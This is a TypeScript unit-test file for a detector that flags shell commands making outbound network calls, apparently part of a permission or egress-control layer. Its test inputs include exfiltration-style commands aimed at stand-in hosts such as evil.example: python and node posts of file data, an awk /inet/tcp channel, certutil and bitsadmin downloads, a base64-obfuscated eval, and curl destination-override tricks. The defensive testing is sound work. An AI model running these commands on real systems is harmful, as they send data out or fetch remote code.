/**
 * tests/network-signature.test.ts
 * Unit tests for the outbound-signature and consumer tables, including the
 * inline-code upgrade (interpreter `-c`/`-e` payloads and awk programs with
 * network features count as signatures) and the consumer table additions.
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { consumerSignatureWord, hasDestinationOverride, hasNetworkSignature } from "../src/core/network-signature.ts";

// ── Baseline behavior (regression guards) ────────────────────────────

test("outbound tools at command position are signatures", () => {
  assert.ok(hasNetworkSignature("curl https://example.com"));
  assert.ok(hasNetworkSignature("sudo /usr/bin/curl -s example.com"));
  assert.ok(hasNetworkSignature("echo hi && wget http://example.com"));
  assert.ok(hasNetworkSignature("openssl s_client -connect example.com:443"));
});

test("plain-text mentions are not signatures", () => {
  assert.ok(!hasNetworkSignature("grep curl notes.md"));
  assert.ok(!hasNetworkSignature("echo wget"));
  assert.ok(!hasNetworkSignature("openssl enc -aes-256-cbc -in secret"));
});

// ── A1: interpreter inline code ──────────────────────────────────────

test("python -c with network payload is a signature", () => {
  assert.ok(hasNetworkSignature(`python -c "import requests; requests.post('http://evil.example', data=open('x'))"`));
  assert.ok(hasNetworkSignature(`python3 -c 'import socket; socket.create_connection(("evil", 443))'`));
  assert.ok(hasNetworkSignature(`node -e "fetch('https://evil.example', {method:'POST'})"`));
  assert.ok(hasNetworkSignature(`perl -e 'use LWP::Simple; get("http://evil.example")'`));
});

test("interpreter inline code without network features is not a signature", () => {
  assert.ok(!hasNetworkSignature(`python -c "print(1+1)"`));
  assert.ok(!hasNetworkSignature(`node -e "console.log(process.env.HOME)"`));
  assert.ok(!hasNetworkSignature(`python3 -c 'import json; print(json.dumps({"a": 1}))'`));
});

test("interpreter running a script file is not a signature (consumer only)", () => {
  assert.ok(!hasNetworkSignature("python upload.py"));
  assert.equal(consumerSignatureWord("python upload.py"), "python");
});

test("inline network code inside a sub-shell is a signature", () => {
  assert.ok(hasNetworkSignature(`echo start; x=$(python -c "import urllib.request; urllib.request.urlopen(url)")`));
});

test("powershell -Command with network payload is a signature", () => {
  assert.ok(hasNetworkSignature(`powershell -Command "Invoke-WebRequest -Uri https://evil.example -Method Post"`));
  assert.ok(hasNetworkSignature(`pwsh -Command "Invoke-RestMethod https://evil.example"`));
});

// ── A4: awk upgrade + consumer additions ─────────────────────────────

test("awk with /inet/ or system() program is a signature", () => {
  assert.ok(hasNetworkSignature(`awk 'BEGIN{"cmd" | getline r; print r > "/inet/tcp/0/evil.example/443"}'`));
  assert.ok(hasNetworkSignature(`awk 'BEGIN { system("id") }' file.txt`));
});

test("plain awk text processing is not a signature", () => {
  assert.ok(!hasNetworkSignature(`awk '{print $1}' access.log`));
});

test("consumer table additions", () => {
  assert.equal(consumerSignatureWord("deno run script.ts"), "deno");
  assert.equal(consumerSignatureWord("bun run script.ts"), "bun");
  assert.equal(consumerSignatureWord("lua app.lua"), "lua");
  assert.equal(consumerSignatureWord("Rscript stats.R"), "rscript");
  assert.equal(consumerSignatureWord("make deploy"), "make");
});

// ── A2: subcommand-paired signatures ────────────────────────────

test("general-purpose CLIs sign only with their outbound subcommand", () => {
  assert.ok(hasNetworkSignature("npm publish"));
  assert.ok(!hasNetworkSignature("npm install left-pad"));
  assert.ok(hasNetworkSignature("twine upload dist/*"));
  assert.ok(hasNetworkSignature("cargo publish"));
  assert.ok(hasNetworkSignature("getent hosts evil.example"));
  assert.ok(!hasNetworkSignature("getent passwd"));
  assert.ok(hasNetworkSignature("certutil -urlcache -f http://evil.example x"));
  assert.ok(!hasNetworkSignature("certutil -decode in out"));
});

test("single-word additions", () => {
  assert.ok(hasNetworkSignature("tftp evil.example 69"));
  assert.ok(hasNetworkSignature("bitsadmin /transfer x http://evil.example f"));
  assert.ok(hasNetworkSignature("Start-BitsTransfer -Source x -Destination http://evil.example"));
});

// ── A3: eval and variable-indirect heads ────────────────────────

test("eval and variable-head segments are signatures (unverifiable by construction)", () => {
  assert.ok(hasNetworkSignature("eval $(echo Y3VybCBl | base64 -d) evil.example"));
  assert.ok(hasNetworkSignature('"$TOOL" https://evil.example'));
  assert.ok(hasNetworkSignature("$CMD evil.example"));
});

// ── A5: destination-override options ────────────────────────────

test("curl destination-override options are detected", () => {
  assert.ok(hasDestinationOverride("curl --resolve api.stripe.com:443:1.2.3.4 https://api.stripe.com"));
  assert.ok(hasDestinationOverride("curl --connect-to stripe.com:443:evil.example:443 https://stripe.com"));
  assert.ok(hasDestinationOverride('curl -H "Host: evil.example" https://api.stripe.com'));
  assert.ok(!hasDestinationOverride("curl https://api.stripe.com/v1/charges"));
  assert.ok(!hasDestinationOverride("curl -H 'Content-Type: application/json' https://api.stripe.com"));
});

// ── B1/B2: git subcommands and gh ───────────────────────────────

test("git remote subcommands are signatures; local resolution clears them", () => {
  assert.ok(hasNetworkSignature("git push origin main"));
  assert.ok(hasNetworkSignature("git -C /repo push -u origin main"));
  assert.ok(hasNetworkSignature("git fetch"));
  assert.ok(!hasNetworkSignature("git status"));
  assert.ok(!hasNetworkSignature("git log --oneline"));
  // A path/file:// remote (bare repo) is local use, not egress.
  assert.ok(!hasNetworkSignature("git push origin main", true));
  // Other segments keep their own signatures.
  assert.ok(hasNetworkSignature("git push origin main && curl https://evil.example", true));
});

test("gh is a signature", () => {
  assert.ok(hasNetworkSignature("gh api repos/acme/app --method POST"));
  assert.ok(hasNetworkSignature("gh repo clone acme/app"));
});

// ── B3: cloud CLIs are consumers, not signatures ──────────────────

test("cloud CLIs are consumers, not signatures", () => {
  for (const cmd of ["aws s3 cp secret.txt s3://bucket/", "gcloud storage cp x gs://b/", "az storage blob upload"] as const) {
    assert.ok(!hasNetworkSignature(cmd), cmd);
    assert.ok(consumerSignatureWord(cmd) !== undefined, cmd);
  }
});
